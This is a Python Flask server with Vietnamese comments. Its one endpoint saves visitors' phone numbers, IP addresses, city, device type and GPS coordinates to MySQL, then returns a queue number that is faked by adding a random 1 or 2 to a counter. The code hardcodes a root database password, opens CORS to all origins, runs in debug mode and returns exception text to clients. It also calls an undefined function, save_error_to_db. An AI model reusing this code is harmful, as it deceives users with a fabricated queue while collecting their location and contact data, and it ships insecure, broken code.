from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import mysql.connector
from mysql.connector import Error
import random

app = Flask(__name__)
CORS(app)  # Kích hoạt CORS cho toàn bộ ứng dụng

stt = 712


# Kết nối MySQL
def create_connection():
    try:
        connection = mysql.connector.connect(
            host='localhost',
            user='root',      # Thay bằng tên người dùng MySQL của bạn
            password='123456',  # Thay bằng mật khẩu MySQL của bạn
            database='web'
        )
        if connection.is_connected():
            print("Kết nối đến MySQL thành công")
            return connection
    except Error as e:
        print(f"Lỗi kết nối MySQL: {e}")
        return None
    
@app.route('/')
def index():
    return render_template('index.html')


# API để nhận và lưu thông tin người dùng
@app.route('/api/save-user-info', methods=['POST'])
def save_user_info():
    connection = None
    try:
        # Nhận dữ liệu từ request
        data = request.json
        phone_number = data.get('phone_number')
        city = data.get('city')
        phone_type = data.get('phone_type')
        game_port = data.get('game_port')
        ip_address = data.get('ip_address')
        latitude = data.get('latitude')  # Nhận vĩ độ từ client
        longitude = data.get('longitude')  # Nhận kinh độ từ client

        # Kiểm tra nếu thiếu thông tin bắt buộc
        if not all([phone_number, city, phone_type, game_port, ip_address]):
            error_message = 'Thiếu một số thông tin bắt buộc.'
            connection = create_connection()
            save_error_to_db(connection, phone_number, city, phone_type, game_port, ip_address, error_message)
            return jsonify({'message': 'Thiếu thông tin, đã lưu lại lỗi'}), 400

        # Kết nối đến MySQL
        connection = create_connection()
        if not connection:
            return jsonify({'message': 'Không thể kết nối đến cơ sở dữ liệu'}), 500

        cursor = connection.cursor()

        # Lưu thông tin vào database
        insert_query = """
            INSERT INTO user_info (phone_number, city, phone_type, game_port, ip_address, latitude, longitude)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
        """
        cursor.execute(insert_query, (phone_number, city, phone_type, game_port, ip_address, latitude, longitude))
        connection.commit()

        cursor.close()
        connection.close()
        global stt 
        stt = stt + random.choice([1, 2])
        # Trả về phản hồi JSON thành công
        return jsonify({'stt': stt}), 200

    except Exception as e:
        # Ghi chi tiết lỗi ra console để tiện theo dõi
        print(f'Lỗi khi xử lý yêu cầu: {e}')

        return jsonify({'message': 'Lỗi máy chủ', 'error': str(e)}), 500

    finally:
        # Đảm bảo đóng kết nối MySQL khi hoàn thành
        if connection and connection.is_connected():
            connection.close()

if __name__ == '__main__':
    app.run(debug=True, port=5000)
